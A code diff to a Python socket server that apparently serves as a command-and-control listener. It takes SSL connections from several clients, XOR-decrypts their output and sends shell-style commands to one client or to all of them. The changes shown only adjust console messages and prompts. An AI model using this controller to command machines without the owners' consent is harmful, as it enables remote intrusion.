@@ -1,5 +1,3 @@
-# server.py
-
 import socket
 import threading
 import sys
@@ -19,14 +17,15 @@ def xor_encrypt_decrypt(data, key):
 
 def handle_client(client_socket, addr, client_id):
     try:
-        http_banner = client_socket.recv(4096)
-        print(f"\n[+] Client {client_id} ({addr[0]}:{addr[1]}) banner:\n{http_banner.decode(errors='ignore')}\n")
+        print(f"\n[+] Client {client_id} ({addr[0]}:{addr[1]}) connected.\n")
 
         while True:
             data = client_socket.recv(4096)
             if not data:
                 break
+
             decrypted = xor_encrypt_decrypt(data, XOR_KEY)
+
             with lock:
                 sys.stdout.buffer.write(f"\n[Client {client_id}] ".encode() + decrypted)
                 sys.stdout.flush()
@@ -36,9 +35,14 @@ def handle_client(client_socket, addr, client_id):
 
     finally:
         with lock:
-            print(f"[-] Client {client_id} disconnected.")
+            print(f"\n[-] Client {client_id} disconnected.")
             if client_id in clients:
                 del clients[client_id]
+            
+            if len(clients) == 1:
+                remaining_client_id = next(iter(clients))
+                sys.stdout.write(f"\n[>] ({remaining_client_id}) $ ")
+                sys.stdout.flush()
         client_socket.close()
 
 def command_sender():
@@ -117,8 +121,9 @@ def main():
 
         with lock:
             clients[client_id] = ssl_socket
-
-        print(f"[+] New SSL connection: Client {client_id} from {addr[0]}:{addr[1]}")
+            print(f"\n[+] New SSL connection: Client {client_id} from {addr[0]}:{addr[1]}")
+            sys.stdout.write("\n[>] Command (format: client_id command OR all command): ")
+            sys.stdout.flush()
 
         client_thread = threading.Thread(target=handle_client, args=(ssl_socket, addr, client_id))
         client_thread.daemon = True
